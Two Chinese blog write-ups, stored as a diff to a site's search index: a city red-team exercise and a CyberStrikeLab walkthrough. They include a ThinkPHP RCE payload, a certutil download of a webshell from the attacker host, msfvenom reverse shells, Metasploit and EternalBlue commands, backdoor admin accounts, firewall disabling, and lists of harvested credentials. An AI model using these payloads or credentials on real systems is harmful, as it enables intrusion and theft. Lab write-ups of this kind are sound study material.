@@ -1,9 +1,350 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2024市护小记</title>
+    <url>/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/</url>
+    <content><![CDATA[<p>年前参与市护，第一次并在攻防演练取得战果，仅做记录</p>
+<h1 id="两台云主机"><a href="#两台云主机" class="headerlink" title="两台云主机"></a>两台云主机</h1><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>入口点</p>
+<p>公网通过某系统通用弱口令拿到 Web 网站</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101950101.png" class title="image-20250306101950101">
+
+<p>翻阅站点，发现一处文件上传接口，简单绕过一下防护就上传成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305212110280.png" class title="image-20250305212110280">
+
+<p>上传 aspx 马，连接失败，判断应该是被 Defender 拦了解析失败，后续进入系统发现没杀软</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305212721356.png" class title="image-20250305212721356">
+
+<p>通过工具制作免杀马再次上传，连接成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213007147.png" class title="image-20250305213007147">
+
+<p>上线CS</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213356723.png" class title="image-20250305213356723">
+
+<p>提权至系统最高权限</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213447863.png" class title="image-20250305213447863">
+
+<p>对内网进行侦察，带一带扫描，可惜没有发现其他主机</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305214606906.png" class title="image-20250305214606906">
+
+<p>权限级已经至顶，拿下 3389 远程桌面</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305214832698.png" class title="image-20250305214832698">
+
+<p>还有数据库，忘记截图，只是一台云主机，没有内网，遗憾收手。</p>
+<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>主页</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101737191.png" class title="image-20250306101737191">
+
+<p>发现该系统存在 Structs2-016，工具利用，拿下该系统</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305215704469.png" class title="image-20250305215704469">
+
+<p>文件浏览</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220135346.png" class title="image-20250305220135346">
+
+<p>拿到 SQLServer 管理员账号密码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.username=sa</span><br><span class="line">db.password=jack_2014</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220337734.png" class title="image-20250305220337734">
+
+
+
+
+
+<h1 id="某网关"><a href="#某网关" class="headerlink" title="某网关"></a>某网关</h1><p>某网关存在命令执行漏洞，通过漏洞拿到 Shell，且执行权限直接为 root</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x:8443/webui/.xxx.php   密码：cmd</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220723939.png" class title="image-20250305220723939">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220744648.png" class title="image-20250305220744648">
+
+<h2 id="双网卡主机，突破逻辑隔离"><a href="#双网卡主机，突破逻辑隔离" class="headerlink" title="双网卡主机，突破逻辑隔离"></a>双网卡主机，突破逻辑隔离</h2><p>突破逻辑隔离，拿到双网卡主机，进入核心业务区之后就是酷酷乱扫，小企业的内网比较脆弱</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306100910479.png" class title="image-20250306100910479">
+
+<h2 id="内网沦陷，二十台主机权限"><a href="#内网沦陷，二十台主机权限" class="headerlink" title="内网沦陷，二十台主机权限"></a>内网沦陷，二十台主机权限</h2><p>后面数量过多，就放一张图片好了</p>
+<p><strong>两台远程桌面</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.200 Administrator Admin12345</span><br><span class="line">192.168.0.123 Administrator Admin123</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101022986.png" class title="image-20250306101022986">
+
+<p><strong>5 x SSH 连接</strong> </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSH:192.168.10.252:22:root 123456</span><br><span class="line">SSH:192.168.0.207:22:admin admin</span><br><span class="line">SSH:192.168.0.206:22:admin password</span><br><span class="line">SSH:192.168.0.205:22:admin password</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305221454516.png" class title="image-20250305221454516">
+
+<p><strong>13 x 永恒之蓝</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.60.145      MS17-010        (Windows 5.1)</span><br><span class="line">192.168.60.55       MS17-010        (Windows 5.1)</span><br><span class="line">192.168.60.168      MS17-010        (Windows 5.1)</span><br><span class="line">192.168.80.89       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.0.230       MS17-010        (Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">192.168.60.84       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.20.24       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.20.112      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.60.53       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.80.128      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.0.250       MS17-010        (Windows Server 2008 R2 Enterprise 7600)</span><br><span class="line">192.168.60.188      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.100.208     MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101129833.png" class title="image-20250306101129833">
+
+<p>FTP 服务器</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://192.168.0.123:21:anonymous</span><br><span class="line">   8uftp_V3.8.2.0_setup.1419410889.exe</span><br><span class="line">ftp://192.168.10.60:21:anonymous</span><br><span class="line">ftp://192.168.60.197:21:anonymous</span><br><span class="line">ftp://192.168.60.115:21:anonymous</span><br><span class="line">ftp://192.168.60.105:21:anonymous</span><br><span class="line">ftp://192.168.60.124:21:anonymous</span><br><span class="line">ftp://192.168.60.155:21:anonymous</span><br><span class="line">ftp://192.168.60.75:21:anonymous</span><br><span class="line">ftp://192.168.60.103:21:anonymous</span><br><span class="line">ftp://192.168.0.88:21:anonymous</span><br><span class="line">ftp://192.168.0.215:21:anonymous</span><br><span class="line">ftp://192.168.60.123:21:anonymous</span><br><span class="line">ftp://192.168.60.129:21:anonymous</span><br><span class="line">ftp://192.168.60.10:21:anonymous</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101144326.png" class title="image-20250306101144326">
+
+<p>MYSQL 数据库</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql:192.168.0.123:3306:root 123</span><br><span class="line">mssql:192.168.0.236:1433:sa 123</span><br><span class="line">mysql:192.168.0.200:3306:root 123</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101306256.png" class title="image-20250306101306256">
+
+
+
+<h1 id="帆软反序列化-RCE-主机权限"><a href="#帆软反序列化-RCE-主机权限" class="headerlink" title="帆软反序列化 RCE 主机权限"></a>帆软反序列化 RCE 主机权限</h1><p>后面还发现一个存在帆软反序列化 RCE 漏洞的系统，直接 root，可惜已经没时间进内网了</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101512096.png" class title="image-20250306101512096">
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>攻防演练</category>
+      </categories>
+      <tags>
+        <tag>攻防</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CyberStrikeLab - lab1</title>
+    <url>/2025/03/05/CyberStrikeLab-lab1/</url>
+    <content><![CDATA[<p><strong>难度: 简单</strong></p>
+<p>目标：本次小李的任务是攻克 192.168.10.0&#x2F;24 网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象中的复杂。</p>
+<h3 id><a href="#" class="headerlink" title></a></h3><h1 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h1><img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302122910501.png" class title="image-20250302122910501">
+
+<p>使用 fscan 对 192.168.10.* 网段进行存活、端口及漏洞扫描，检测出了 thinkphp5023 漏洞</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228114857535.png" class title="image-20250228114857535">
+
+<p>站点如下</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115021823.png" class title="image-20250228115021823">
+
+
+
+<h1 id="边界突破-192-168-10-10"><a href="#边界突破-192-168-10-10" class="headerlink" title="边界突破 - 192.168.10.10"></a>边界突破 - 192.168.10.10</h1><h2 id="ThinkPHP-5-0-23-RCE"><a href="#ThinkPHP-5-0-23-RCE" class="headerlink" title="ThinkPHP 5.0.23 RCE"></a>ThinkPHP 5.0.23 RCE</h2><p><strong>工具库利用</strong></p>
+<p>使用 ThinkPHP 漏洞扫描工具进行历史漏洞扫描，发现大量 thinphp nday 都能打通</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115120674.png" class title="image-20250228115120674">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115129755.png" class title="image-20250228115129755">
+
+<p>上传一句话木马文件</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115200680.png" class title="image-20250228115200680">
+
+<p>蚁剑连接成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115226573.png" class title="image-20250228115226573">
+
+<p><strong>手工利用</strong></p>
+<p>再换一种手工利用的手法</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:  http://192.168.10.10/?s=captcha&amp;test=-1</span><br><span class="line">POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure></div>
+
+<p>执行有一瞬间出现命令执行结果，然后跳转至 404 页面</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100619418.png" class title="image-20250302100619418">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100642312.png" class title="image-20250302100642312">
+
+<p>接下来手工利用反弹 shell，nc 开启 22222 Port</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100936292.png" class title="image-20250302100936292">
+
+<p>生成 powershell 反弹命令，IP 选择 OpenVPN 分配的 IP 172.16.233.2</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101132647.png" class title="image-20250302101132647">
+
+<p>Base64 编码并执行，注意关闭防火墙或设置防火墙配置</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101207302.png" class title="image-20250302101207302">
+
+<p>成功得到 Shell</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101308073.png" class title="image-20250302101308073">
+
+<p>直接 &gt; 写入一句话木马发现每个字符间存在空字节，导致 PHP 解析错误；</p>
+<p>系统内有 certutil，使用其下载本地准备好的一句话木马</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302103707223.png" class title="image-20250302103707223">
+
+<p>本地开启 python web服务</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104258607.png" class title="image-20250302104258607">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://172.16.233.2:22223/1.php</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104348794.png" class title="image-20250302104348794">
+
+<p>一句话木马文件下载在网站根目录，蚁剑连接，成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104244291.png" class title="image-20250302104244291">
+
+<p>C 盘根目录拿下旗帜一</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104554321.png" class title="image-20250302104554321">
+
+<p><strong>上线 CS</strong></p>
+<p>上传 CS 木马并执行</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114942426.png" class title="image-20250302114942426">
+
+<p>机器上线成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302115031318.png" class title="image-20250302115031318">
+
+<p>禁用防火墙</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off 	//关闭所有防火墙，winsows server 2003 之后</span><br><span class="line">netsh advfirewall show allprofiles   //查询域、私有、共有防火墙状态</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302115723132.png" class title="image-20250302115723132">
+
+
+
+<h2 id="3389-远程桌面连接"><a href="#3389-远程桌面连接" class="headerlink" title="3389 远程桌面连接"></a>3389 远程桌面连接</h2><p>开启 3389 端口</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105830463.png" class title="image-20250302105830463">
+
+<p>添加自定义用户</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user abcc 123@abc /add</span><br><span class="line">net localgroup Administrators abcc /add</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105810303.png" class title="image-20250302105810303">
+
+<p>尝试远程桌面连接</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105950985.png" class title="image-20250302105950985">
+
+<p>身份证验证导致的错误，直接禁用掉身份证验证</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302110101538.png" class title="image-20250302110101538">
+
+<p>再次尝试，成功登录</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111506571.png" class title="image-20250302111506571">
+
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>翻阅 phpstudy，找到数据库用户名密码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">root/cyberstrike@2024</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111740743.png" class title="image-20250302111740743">
+
+<p>尝试使用 phpstudy 文件 mysql.exe 登录数据库，失败</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113247646.png" class title="image-20250302113247646">
+
+<p>phpstudy 中MYSQL并没有开启，尝试直接点击启动，会马上跳回关闭，启动失败</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113617815.png" class title="image-20250302113617815">
+
+<p>很奇怪的状态，对方是有 3306 端口使用的，我尝试查看当前 mysql 状态</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc query mysql</span><br></pre></td></tr></table></figure></div>
+
+<p>state: 1 stopped，当前 mysql 并没有开启</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113532666.png" class title="image-20250302113532666">
+
+<p>接下来登录管理员命令行开启 mysql，Windows Server 2012R2 环境较老，win + R 在运行启用管理员命令行失败。打开任务管理器，点击文件，运行新任务，勾选以系统管理权限创建此任务，确定。</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114148322.png" class title="image-20250302114148322">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114219492.png" class title="image-20250302114219492">
+
+<p>启动 mysql 服务</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114304781.png" class title="image-20250302114304781">
+
+<p>再次尝试连接 MySQL，登录成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114337558.png" class title="image-20250302114337558">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114613073.png" class title="image-20250302114613073">
+
+<p>创建一个允许远程连接的用户并给予足够权限</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;aabbcc&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;aabbcc&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;aabbcc&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302130321863.png" class title="image-20250302130321863">
+
+<p>拿下数据库</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302130419465.png" class title="image-20250302130419465">
+
+
+
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>外网机器是双网卡，目标内网还有一个 192.168.20.X 网段</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302190303722.png" class title="image-20250302190303722">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303105119541.png" class title="image-20250303105119541">
+
+<p><strong>Fscan 扫描</strong> </p>
+<p>使用 fscan 对 20 段进行扫描</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.20.0/24</span><br></pre></td></tr></table></figure></div>
+
+<p>发现 20 和 30 都有永恒之蓝漏洞</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.20.20:139 open</span><br><span class="line">192.168.20.10:139 open</span><br><span class="line">192.168.20.10:3306 open</span><br><span class="line">192.168.20.30:445 open</span><br><span class="line">192.168.20.20:445 open</span><br><span class="line">192.168.20.10:445 open</span><br><span class="line">192.168.20.30:139 open</span><br><span class="line">192.168.20.30:135 open</span><br><span class="line">192.168.20.20:135 open</span><br><span class="line">192.168.20.10:80 open</span><br><span class="line">192.168.20.30:88 open</span><br><span class="line">192.168.20.10:135 open</span><br><span class="line">[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetBios 192.168.20.10   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.20</span><br><span class="line">   [-&gt;]cyberweb</span><br><span class="line">   [-&gt;]192.168.20.20</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.30</span><br><span class="line">   [-&gt;]WIN-7NRTJO59O7N</span><br><span class="line">   [-&gt;]192.168.20.30</span><br><span class="line">[+] MS17-010 192.168.20.20	(Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[+] MS17-010 192.168.20.30	(Windows Server 2008 R2 Standard 7600)</span><br><span class="line">[*] WebTitle http://192.168.20.10      code:200 len:25229  title:易优CMS -  Powered by Eyoucms.com</span><br><span class="line">[+] PocScan http://192.168.20.10 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h2><p><strong>CS 派发 MSF 会话</strong>，先开启MSF</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 172.16.233.2</span><br><span class="line">set LPORT 4777</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>CS 启动监听，配置与 MSF 一致</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303122413992.png" class title="image-20250303122413992">
+
+<p>选择 192.168.10.10 会话，spawn 选择刚配置的监听，点击 Choose，MSF 成功接收到 CS 的会话</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303122832054.png" class title="image-20250303122832054">
+
+<p>MSF 配置路由</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.20.0/24</span><br><span class="line">run autoroute -p  //观测路由是否添加成功</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123219982.png" class title="image-20250303123219982">
+
+<p>MSF 设置 Socks 代理</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">search socks || use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 172.16.233.2</span><br><span class="line">run</span><br><span class="line">sudo vi /etc/proxychains4.conf  //修改配置文件和选项设置的一致，且注意sock4、sock5一致</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123310096.png" class title="image-20250303123310096">
+
+<p>永恒之蓝漏洞利用，尝试模块，发现 ms17_010_command 能够被利用</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use 19</span><br><span class="line">set COMMAND whoami</span><br><span class="line">set RHOSTS 172.16.233.2</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123725242.png" class title="image-20250303123725242">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;dir C:\&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123932158.png" class title="image-20250303123932158">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;type C:\flag.txt&#x27;</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>拿到第二个旗帜 </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124022556.png" class title="image-20250303124022556">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;net user abcc 123@abc /add&#x27;</span><br><span class="line">set COMMAND &#x27;net localgroup Administrators abcc /add&#x27;</span><br><span class="line">set COMMAND &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124059122.png" class title="image-20250303124059122">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124302763.png" class title="image-20250303124302763">
+
+<p>远程桌面连接</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124355986.png" class title="image-20250303124355986">
+
+<p>.\用户名 登录，成功登录</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303154731381.png" class title="image-20250303154731381">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303162638253.png" class title="image-20250303162638253">
+
+<h2 id="域成员-192-168-20-20"><a href="#域成员-192-168-20-20" class="headerlink" title="域成员 - 192.168.20.20"></a>域成员 - 192.168.20.20</h2><p>这台机器同样爆出了永恒之蓝，但一直利用失败，不过因为我们已经拿下域控制器，所以可以换一种方式，去拿域控制器的 hash，对域成员做 PTH 攻击 </p>
+<p>上线 MSF</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.20.10</span><br><span class="line">set lport 23231</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.208.138 LPORT=6666 -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>制作木马并上传，上传稍麻烦，因为隧道搭在 MSF，因此选择将木马上传到 192.168.10.10 主机上，通过 phpstudy 自带 php 开启 Web 服务，再通过 192.168.20.30 浏览器下载文件</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php.exe -S 0.0.0.0:22222</span><br></pre></td></tr></table></figure></div>
+
+<p>访问并保存，运行即可</p>
